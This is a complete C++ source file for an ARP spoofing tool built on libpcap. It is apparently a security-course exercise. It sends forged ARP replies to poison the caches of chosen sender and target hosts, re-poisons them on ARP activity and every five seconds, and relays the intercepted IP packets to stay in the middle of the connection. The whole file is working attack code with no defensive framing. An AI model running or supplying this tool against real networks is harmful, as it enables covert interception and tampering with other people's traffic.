#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <string>
#include <vector>

#include <arpa/inet.h>
#include <net/if.h>
#include <pcap.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

struct IpHdr final {
    uint8_t v_hl_;
    uint8_t tos_;
    uint16_t len_;
    uint16_t id_;
    uint16_t off_;
    uint8_t ttl_;
    uint8_t p_;
    uint16_t sum_;
    uint32_t sip_;
    uint32_t dip_;

    Ip sip() const { return Ip(ntohl(sip_)); }
    Ip dip() const { return Ip(ntohl(dip_)); }
};
#pragma pack(pop)

struct Flow {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
    Mac targetMac;
};

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

bool getAttackerInfo(const char* dev, Mac& attackerMac, Ip& attackerIp) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sock);
        return false;
    }
    attackerMac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        close(sock);
        return false;
    }
    attackerIp = Ip(std::string(inet_ntoa(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr)));

    close(sock);
    return true;
}

bool sendArpRequest(pcap_t* pcap, const Mac& attackerMac, const Ip& attackerIp, const Ip& queryIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(attackerIp);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(queryIp);

    return pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) == 0;
}

bool resolveMac(pcap_t* pcap, const Mac& attackerMac, const Ip& attackerIp, const Ip& queryIp, Mac& resolvedMac) {
    if (!sendArpRequest(pcap, attackerMac, attackerIp, queryIp)) {
        return false;
    }

    time_t start = time(nullptr);
    while (time(nullptr) - start < 3) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);

        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
        if (header->caplen < sizeof(EthArpPacket)) continue;

        EthArpPacket* arpPacket = (EthArpPacket*)packet;
        if (arpPacket->eth_.type() != EthHdr::Arp) continue;
        if (arpPacket->arp_.op() != ArpHdr::Reply) continue;

        if (arpPacket->arp_.sip() == queryIp &&
            arpPacket->arp_.tip() == attackerIp &&
            arpPacket->arp_.tmac() == attackerMac) {
            resolvedMac = arpPacket->arp_.smac();
            return true;
        }
    }
    return false;
}

bool sendArpReply(pcap_t* pcap, const Mac& attackerMac, const Mac& dstMac, const Ip& spoofIp, const Ip& dstIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = dstMac;
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(spoofIp);
    packet.arp_.tmac_ = dstMac;
    packet.arp_.tip_ = htonl(dstIp);

    return pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) == 0;
}

bool infectFlow(pcap_t* pcap, const Mac& attackerMac, const Flow& flow) {
    bool senderInfect = sendArpReply(pcap, attackerMac, flow.senderMac, flow.targetIp, flow.senderIp);
    bool targetInfect = sendArpReply(pcap, attackerMac, flow.targetMac, flow.senderIp, flow.targetIp);
    return senderInfect && targetInfect;
}

void infectAllFlows(pcap_t* pcap, const Mac& attackerMac, const std::vector<Flow>& flows) {
    for (size_t i = 0; i < flows.size(); i++) {
        infectFlow(pcap, attackerMac, flows[i]);
    }
}

bool shouldReinfect(EthArpPacket* packet, const Flow& flow) {
    if (packet->eth_.type() != EthHdr::Arp) return false;

    if (packet->arp_.smac() == flow.senderMac || packet->arp_.smac() == flow.targetMac) {
        return true;
    }

    return false;
}

bool relayPacket(pcap_t* pcap, const u_char* packet, uint32_t packetLen,
                 const Mac& attackerMac, const Ip& attackerIp, const std::vector<Flow>& flows) {
    if (packetLen < sizeof(EthHdr) + sizeof(IpHdr)) return false;

    EthHdr* eth = (EthHdr*)packet;
    if (eth->type() != EthHdr::Ip4) return false;
    if (eth->dmac() != attackerMac) return false;

    const IpHdr* ipHdr = (const IpHdr*)(packet + sizeof(EthHdr));
    if (ipHdr->dip() == attackerIp) return false;

    std::vector<u_char> relayBuf(packet, packet + packetLen);
    EthHdr* relayEth = (EthHdr*)relayBuf.data();

    for (size_t i = 0; i < flows.size(); i++) {
        // Sender -> Target 방향
        if (eth->smac() == flows[i].senderMac) {
            relayEth->smac_ = attackerMac;
            relayEth->dmac_ = flows[i].targetMac;
            return pcap_sendpacket(pcap, relayBuf.data(), packetLen) == 0;
        }

        // Target -> Sender
        if (eth->smac() == flows[i].targetMac && ipHdr->dip() == flows[i].senderIp) {
            relayEth->smac_ = attackerMac;
            relayEth->dmac_ = flows[i].senderMac;
            return pcap_sendpacket(pcap, relayBuf.data(), packetLen) == 0;
        }
    }

    return false;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, 65536, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac attackerMac;
    Ip attackerIp;
    if (!getAttackerInfo(dev, attackerMac, attackerIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    printf("attacker mac: %s\n", std::string(attackerMac).c_str());
    printf("attacker ip : %s\n", std::string(attackerIp).c_str());

    std::vector<Flow> flows;
    for (int i = 2; i < argc; i += 2) {
        Flow flow;
        flow.senderIp = Ip(std::string(argv[i]));
        flow.targetIp = Ip(std::string(argv[i + 1]));

        if (!resolveMac(pcap, attackerMac, attackerIp, flow.senderIp, flow.senderMac)) {
            fprintf(stderr, "failed to resolve sender mac: %s\n", argv[i]);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        if (!resolveMac(pcap, attackerMac, attackerIp, flow.targetIp, flow.targetMac)) {
            fprintf(stderr, "failed to resolve target mac: %s\n", argv[i + 1]);
            pcap_close(pcap);
            return EXIT_FAILURE;
        }

        printf("sender ip  : %s\n", std::string(flow.senderIp).c_str());
        printf("sender mac : %s\n", std::string(flow.senderMac).c_str());
        printf("target ip  : %s\n", std::string(flow.targetIp).c_str());
        printf("target mac : %s\n", std::string(flow.targetMac).c_str());

        flows.push_back(flow);
    }

    infectAllFlows(pcap, attackerMac, flows);
    time_t lastInfectTime = time(nullptr);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);

        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "pcap_next_ex error: %s\n", pcap_geterr(pcap));
            break;
        }

        if (res == 1) {
            if (header->caplen >= sizeof(EthArpPacket)) {
                EthArpPacket* arpPacket = (EthArpPacket*)packet;
                for (size_t i = 0; i < flows.size(); i++) {
                    if (shouldReinfect(arpPacket, flows[i])) {
                        infectFlow(pcap, attackerMac, flows[i]);
                    }
                }
            }

            relayPacket(pcap, packet, header->caplen, attackerMac, attackerIp, flows);
        }

        if (time(nullptr) - lastInfectTime >= 5) {
            infectAllFlows(pcap, attackerMac, flows);
            lastInfectTime = time(nullptr);
        }
    }

    pcap_close(pcap);
    return EXIT_SUCCESS;
}
